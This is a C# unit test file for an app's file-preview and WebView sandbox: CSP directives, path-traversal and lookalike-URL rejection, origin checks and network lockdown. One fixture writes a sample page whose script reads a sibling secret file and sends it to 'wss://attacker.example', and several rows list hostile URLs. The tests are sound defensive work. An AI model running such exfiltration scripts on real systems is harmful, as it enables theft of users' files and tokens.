using Pollux.Core.Files;

namespace Pollux.Core.Tests.Files;

[TestClass]
public sealed class PreviewPolicyTests
{
    [TestMethod]
    [DataRow("png", PreviewMode.NativeImage)]
    [DataRow("JPG", PreviewMode.NativeImage)]
    [DataRow("ico", PreviewMode.NativeImage)]
    [DataRow("html", PreviewMode.SandboxedWeb)]
    [DataRow("htm", PreviewMode.SandboxedWeb)]
    [DataRow("svg", PreviewMode.SandboxedWeb)]
    [DataRow("pdf", PreviewMode.SandboxedWeb)]
    [DataRow("mp4", PreviewMode.SandboxedWeb)]
    [DataRow("mp3", PreviewMode.SandboxedWeb)]
    [DataRow("cs", PreviewMode.Text)]
    [DataRow("js", PreviewMode.Text)]
    [DataRow("xhtml", PreviewMode.Text)]
    [DataRow("", PreviewMode.Text)]
    public void ModeDependsOnTheExtension(string extension, PreviewMode expected) =>
        Assert.AreEqual(expected, PreviewPolicy.ModeFor(extension));

    [TestMethod]
    [DataRow("docx", true)]
    [DataRow("XLSX", true)]
    [DataRow("pptx", true)]
    [DataRow("msg", true)]
    [DataRow("eml", true)]
    [DataRow("vsdx", true)]
    [DataRow("ttf", true)]
    [DataRow("otf", true)]
    [DataRow("unknownext", true)]
    [DataRow("png", false)]
    [DataRow("pdf", false)]
    [DataRow("html", false)]
    [DataRow("svg", false)]
    [DataRow("mp4", false)]
    [DataRow("txt", false)]
    [DataRow("md", false)]
    [DataRow("cs", false)]
    [DataRow("JSON", false)]
    [DataRow("xml", false)]
    [DataRow("ps1", false)]
    [DataRow("", false)]
    public void OwnViewersWinOverShellHandlersForTheirTypes(string extension, bool expected) =>
        Assert.AreEqual(expected, PreviewPolicy.PrefersShellHandler(extension));

    [TestMethod]
    [DataRow(null, true)]
    [DataRow("[ZoneTransfer]\r\nZoneId=0\r\n", true)]
    [DataRow("[ZoneTransfer]\r\nZoneId=1", true)]
    [DataRow("[ZoneTransfer]\nZoneId=2\nHostUrl=file://server/x", true)]
    [DataRow("[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://example.com/\r\nHostUrl=https://example.com/a.docx\r\n", false)]
    [DataRow("[ZoneTransfer]\r\nzoneid = 4\r\n", false)]
    [DataRow("[ZoneTransfer]\r\nZoneId=x\r\n", false)]
    [DataRow("[ZoneTransfer]\r\nZoneId\r\n", false)]
    [DataRow("garbage", false)]
    [DataRow("", false)]
    public void DownloadedFilesNeverGoToShellHandlers(string? zoneIdentifier, bool expected) =>
        Assert.AreEqual(expected, PreviewPolicy.AllowsShellHandler(zoneIdentifier));

    private const string FileUrl = "https://pollux.preview/evil.html";

    private static Dictionary<string, string> Directives(string csp) =>
        csp.Split(';', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
            .Select(d => d.Split(' ', 2))
            .ToDictionary(p => p[0], p => p.Length > 1 ? p[1] : "", StringComparer.Ordinal);

    [TestMethod]
    [DataRow("html")]
    [DataRow("htm")]
    [DataRow("svg")]
    public void S07_ScriptedDocumentsGetACspWithoutScriptConnectFramesOrObjects(string extension)
    {
        var csp = PreviewPolicy.ContentSecurityPolicy(extension, FileUrl);
        Assert.IsNotNull(csp);
        var d = Directives(csp);
        Assert.AreEqual("'none'", d["default-src"]);
        Assert.AreEqual("'none'", d["script-src"]);
        Assert.AreEqual("'none'", d["connect-src"]);
        Assert.AreEqual("'none'", d["frame-src"]);
        Assert.AreEqual("'none'", d["object-src"]);
        Assert.AreEqual("'none'", d["form-action"]);
        Assert.AreEqual("'none'", d["base-uri"]);
        Assert.IsTrue(d.ContainsKey("sandbox"), "sandbox directive: no scripts, forms, popups or top navigation");
        Assert.AreEqual("", d["sandbox"]);
    }

    [TestMethod]
    public void S07_ImagesMediaAndStylesComeOnlyFromTheFileItself()
    {
        var d = Directives(PreviewPolicy.ContentSecurityPolicy("html", FileUrl)!);
        Assert.AreEqual(FileUrl + " data:", d["img-src"]);
        Assert.AreEqual(FileUrl, d["media-src"]);
        Assert.AreEqual(FileUrl + " 'unsafe-inline'", d["style-src"]);
        var sources = d.Values.SelectMany(v => v.Split(' ', StringSplitOptions.RemoveEmptyEntries));
        foreach (var source in sources)
            Assert.IsTrue(source is "'none'" or "'unsafe-inline'" or "data:" or FileUrl, $"unexpected source {source}");
    }

    private static readonly string Previewed = Path.Combine(Path.GetTempPath(), "downloads", "evil page.html");

    [TestMethod]
    public void TheFileUrlNamesOnlyTheFileOnThePreviewHost() =>
        Assert.AreEqual("https://pollux.preview/evil%20page.html", PreviewPolicy.FileUrl(Previewed));

    [TestMethod]
    public void TheFileItselfIsServedWithItsTypeAndCsp()
    {
        var r = PreviewPolicy.Respond("https://pollux.preview/evil%20page.html", Previewed);
        Assert.IsNotNull(r);
        Assert.AreEqual(200, r.Status);
        Assert.AreEqual(Previewed, r.FilePath);
        Assert.AreEqual("text/html", r.ContentType);
        Assert.AreEqual(PreviewPolicy.ContentSecurityPolicy("html", "https://pollux.preview/evil%20page.html"), r.ContentSecurityPolicy);
    }

    [TestMethod]
    [DataRow("https://pollux.preview/secret.txt")]
    [DataRow("https://pollux.preview/sub/evil%20page.html")]
    [DataRow("https://pollux.preview/evil%20page.html/../secret.txt")]
    [DataRow("https://pollux.preview/%2e%2e/secret.txt")]
    [DataRow("https://pollux.preview/..%2Fsecret.txt")]
    [DataRow("https://pollux.preview/evil%20page.html?x=1")]
    [DataRow("https://pollux.preview/")]
    [DataRow("http://pollux.preview/evil%20page.html")]
    [DataRow("https://pollux.preview:444/evil%20page.html")]
    [DataRow("https://user@pollux.preview/evil%20page.html")]
    public void S07_SiblingsSubfoldersAndLookalikesOfThePreviewedFileAreNotFound(string request)
    {
        var r = PreviewPolicy.Respond(request, Previewed);
        Assert.IsNotNull(r);
        Assert.AreEqual(404, r.Status);
        Assert.IsNull(r.FilePath);
    }

    [TestMethod]
    public void AStaleRequestForAnEarlierFileIsNotFoundOnceAnotherFileIsPreviewed()
    {
        var other = Path.Combine(Path.GetTempPath(), "downloads", "next.svg");
        Assert.AreEqual(404, PreviewPolicy.Respond("https://pollux.preview/evil%20page.html", other)!.Status);
        Assert.AreEqual(404, PreviewPolicy.Respond("https://pollux.preview/evil%20page.html", null)!.Status);
        Assert.AreEqual("image/svg+xml", PreviewPolicy.Respond("https://pollux.preview/next.svg", other)!.ContentType);
    }

    [TestMethod]
    public void RequestsForOtherHostsAreNotThePreviewHandlersBusiness() =>
        Assert.IsNull(PreviewPolicy.Respond("https://pollux.assets/blank.html", Previewed));

    private static string TempFolder()
    {
        var dir = Path.Combine(Path.GetTempPath(), "pollux-preview-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        return dir;
    }

    private static string ReadAll(Stream s)
    {
        using var reader = new StreamReader(s);
        return reader.ReadToEnd();
    }

    [TestMethod]
    public void S07_AScriptedPageCannotReadItsSiblingFile()
    {
        var dir = TempFolder();
        try
        {
            var page = Path.Combine(dir, "evil.html");
            File.WriteAllText(page, "<script>fetch('secret.txt').then(r => r.text()).then(t => new WebSocket('wss://attacker.example/' + t))</script>");
            File.WriteAllText(Path.Combine(dir, "secret.txt"), "TOKEN");

            using var doc = PreviewPolicy.Open("https://pollux.preview/evil.html", page, null)!;
            Assert.AreEqual(200, doc.Status);
            StringAssert.Contains(doc.Headers, "Content-Type: text/html\r\n");
            StringAssert.Contains(doc.Headers, "Content-Security-Policy: default-src 'none'; script-src 'none'; connect-src 'none'");
            StringAssert.Contains(doc.Headers, "X-Content-Type-Options: nosniff\r\n");
            StringAssert.StartsWith(ReadAll(doc.Body!), "<script>");

            using var sibling = PreviewPolicy.Open("https://pollux.preview/secret.txt", page, null)!;
            Assert.AreEqual(404, sibling.Status);
            Assert.IsNull(sibling.Body);
        }
        finally { Directory.Delete(dir, true); }
    }

    [TestMethod]
    public void MediaCanBeSeekedThroughRangeRequests()
    {
        var dir = TempFolder();
        try
        {
            var video = Path.Combine(dir, "clip.mp4");
            File.WriteAllText(video, "0123456789");

            using var whole = PreviewPolicy.Open("https://pollux.preview/clip.mp4", video, null)!;
            Assert.AreEqual(200, whole.Status);
            StringAssert.Contains(whole.Headers, "Accept-Ranges: bytes\r\n");
            StringAssert.Contains(whole.Headers, "Content-Length: 10\r\n");
            Assert.IsFalse(whole.Headers.Contains("Content-Security-Policy", StringComparison.Ordinal));

            using var part = PreviewPolicy.Open("https://pollux.preview/clip.mp4", video, "bytes=3-5")!;
            Assert.AreEqual(206, part.Status);
            StringAssert.Contains(part.Headers, "Content-Range: bytes 3-5/10\r\n");
            StringAssert.Contains(part.Headers, "Content-Length: 3\r\n");
            Assert.AreEqual("345", ReadAll(part.Body!));

            using var tail = PreviewPolicy.Open("https://pollux.preview/clip.mp4", video, "bytes=7-")!;
            Assert.AreEqual("789", ReadAll(tail.Body!));

            using var suffix = PreviewPolicy.Open("https://pollux.preview/clip.mp4", video, "bytes=-2")!;
            Assert.AreEqual("89", ReadAll(suffix.Body!));

            using var beyond = PreviewPolicy.Open("https://pollux.preview/clip.mp4", video, "bytes=10-")!;
            Assert.AreEqual(416, beyond.Status);
            StringAssert.Contains(beyond.Headers, "Content-Range: bytes */10\r\n");

            using var odd = PreviewPolicy.Open("https://pollux.preview/clip.mp4", video, "bytes=1-2,4-5")!;
            Assert.AreEqual(200, odd.Status, "multi-ranges are answered with the whole file");
        }
        finally { Directory.Delete(dir, true); }
    }

    [TestMethod]
    public void AFileThatVanishedIsNotFound()
    {
        var dir = TempFolder();
        try
        {
            using var gone = PreviewPolicy.Open("https://pollux.preview/gone.html", Path.Combine(dir, "gone.html"), null)!;
            Assert.AreEqual(404, gone.Status);
        }
        finally { Directory.Delete(dir, true); }
    }

    [TestMethod]
    [DataRow("https://pollux.assets/terminal.html", WebViewKind.Terminal)]
    [DataRow("https://pollux.assets/notes.html", WebViewKind.Notes)]
    [DataRow("https://pollux.assets/preview.html", WebViewKind.CodePreview)]
    [DataRow("https://POLLUX.ASSETS/copilot.html", WebViewKind.CopilotPanel)]
    [DataRow("https://pollux.assets/snap.html", WebViewKind.SnapBoard)]
    public void OwnPagesAreAcceptedAsMessageSources(string source, WebViewKind view) =>
        Assert.IsTrue(WebViewPolicy.IsOwnSource(source, view));

    [TestMethod]
    [DataRow("https://pollux.preview/evil.html", WebViewKind.Terminal)]
    [DataRow("https://pollux.assets/notes.html", WebViewKind.Terminal)]
    [DataRow("https://pollux.assets.evil.com/terminal.html", WebViewKind.Terminal)]
    [DataRow("http://pollux.assets/terminal.html", WebViewKind.Terminal)]
    [DataRow("https://pollux.assets:8443/terminal.html", WebViewKind.Terminal)]
    [DataRow("https://pollux.assets@evil.com/terminal.html", WebViewKind.Terminal)]
    [DataRow("https://evil.com/terminal.html", WebViewKind.Terminal)]
    [DataRow("file:///C:/Users/me/terminal.html", WebViewKind.Terminal)]
    [DataRow("about:blank", WebViewKind.Notes)]
    [DataRow("null", WebViewKind.CopilotPanel)]
    [DataRow("", WebViewKind.CopilotPanel)]
    [DataRow(null, WebViewKind.CopilotPanel)]
    [DataRow("https://pollux.preview/evil.html", WebViewKind.FilePreview)]
    [DataRow("https://pollux.assets/blank.html", WebViewKind.FilePreview)]
    [DataRow("https://pollux.assets/notes.html", WebViewKind.SnapBoard)]
    [DataRow("https://pollux.assets/snap.html", WebViewKind.Notes)]
    public void OtherMessageSourcesAreRejected(string? source, WebViewKind view) =>
        Assert.IsFalse(WebViewPolicy.IsOwnSource(source, view));

    [TestMethod]
    [DataRow("https://pollux.assets/terminal.html")]
    [DataRow("https://pollux.assets/monaco/vs/loader.js")]
    [DataRow("about:blank")]
    [DataRow("blob:https://pollux.assets/1234")]
    [DataRow("data:text/javascript,1")]
    public void OwnViewsLoadOnlyAppAssets(string uri) =>
        Assert.IsTrue(WebViewPolicy.IsAllowedRequest(uri, WebViewKind.Notes, null));

    [TestMethod]
    [DataRow("https://pollux.preview/evil.html")]
    [DataRow("https://attacker.example/x")]
    [DataRow("wss://attacker.example/x")]
    [DataRow("https://pollux.assets.evil.com/x")]
    [DataRow("http://pollux.assets/x")]
    [DataRow("file:///C:/Windows/win.ini")]
    [DataRow("\\\\attacker\\share\\x")]
    public void OwnViewsRejectEverythingElseIncludingThePreviewHost(string uri)
    {
        Assert.IsFalse(WebViewPolicy.IsAllowedRequest(uri, WebViewKind.Terminal, Previewed));
        Assert.IsFalse(WebViewPolicy.IsAllowedNavigation(uri, WebViewKind.Terminal, Previewed));
    }

    [TestMethod]
    [DataRow(WebViewKind.Terminal)]
    [DataRow(WebViewKind.Notes)]
    [DataRow(WebViewKind.CodePreview)]
    [DataRow(WebViewKind.CopilotPanel)]
    public void OnlyTheFilePreviewAllowsThePreviewHost(WebViewKind view)
    {
        // S-16: the previewed file, even while it is shown, is not reachable from Pollux's own pages.
        const string file = "https://pollux.preview/evil%20page.html";
        Assert.IsFalse(WebViewPolicy.IsAllowedNavigation(file, view, Previewed));
        Assert.IsFalse(WebViewPolicy.IsAllowedRequest(file, view, Previewed));
        Assert.IsTrue(WebViewPolicy.IsAllowedNavigation(file, WebViewKind.FilePreview, Previewed));
    }

    [TestMethod]
    public void TheFilePreviewNavigatesOnlyToItsOneFileOrBlank()
    {
        Assert.IsTrue(WebViewPolicy.IsAllowedNavigation("https://pollux.preview/evil%20page.html", WebViewKind.FilePreview, Previewed));
        Assert.IsTrue(WebViewPolicy.IsAllowedNavigation("https://pollux.assets/blank.html", WebViewKind.FilePreview, Previewed));
        Assert.IsTrue(WebViewPolicy.IsAllowedNavigation("about:blank", WebViewKind.FilePreview, Previewed));
        Assert.IsFalse(WebViewPolicy.IsAllowedNavigation("https://pollux.preview/secret.txt", WebViewKind.FilePreview, Previewed));
        Assert.IsFalse(WebViewPolicy.IsAllowedNavigation("https://pollux.assets/terminal.html", WebViewKind.FilePreview, Previewed));
        Assert.IsFalse(WebViewPolicy.IsAllowedNavigation("https://attacker.example/", WebViewKind.FilePreview, Previewed));
        Assert.IsFalse(WebViewPolicy.IsAllowedRequest("https://pollux.assets/monaco/vs/loader.js", WebViewKind.FilePreview, Previewed));
        Assert.IsFalse(WebViewPolicy.IsAllowedRequest("wss://attacker.example/", WebViewKind.FilePreview, Previewed));
    }

    [TestMethod]
    public void S07_BrowserArgumentsKeepWebRtcAndDnsPrefetchOffTheNetwork()
    {
        var args = WebViewPolicy.BrowserArguments.Split(' ');
        CollectionAssert.Contains(args, "--force-webrtc-ip-handling-policy=disable_non_proxied_udp");
        CollectionAssert.Contains(args, "--dns-prefetch-disable");
        CollectionAssert.Contains(args, "--disable-background-networking");
        Assert.AreEqual(1, args.Count(a => a.StartsWith("--disable-features=", StringComparison.Ordinal)), "a second --disable-features overrides the first");
        StringAssert.Contains(WebViewPolicy.BrowserArguments, "msSmartScreenProtection");
    }

    [TestMethod]
    public void S07_BrowserArgumentsRouteEverythingIntoADeadLoopbackProxy()
    {
        // Seen in the Windows VM: a previewed page's <iframe src="http://host/"> opened a TCP connection to the host
        // although the navigation was cancelled and the CSP forbids frames. A dead proxy leaves no direct route out;
        // Pollux's own pages are served from virtual hosts and never reach the proxy.
        var args = WebViewPolicy.BrowserArguments.Split(' ');
        CollectionAssert.Contains(args, "--proxy-server=http://127.0.0.1:9");
        CollectionAssert.Contains(args, "--proxy-bypass-list=<-loopback>", "loopback must go through the proxy too");
    }

    [TestMethod]
    [DataRow("pdf")]
    [DataRow("mp4")]
    [DataRow("wav")]
    public void PdfAndMediaGetNoDocumentCspBecauseTheyAreNoScriptedDocuments(string extension) =>
        Assert.IsNull(PreviewPolicy.ContentSecurityPolicy(extension, "https://pollux.preview/x." + extension));
}
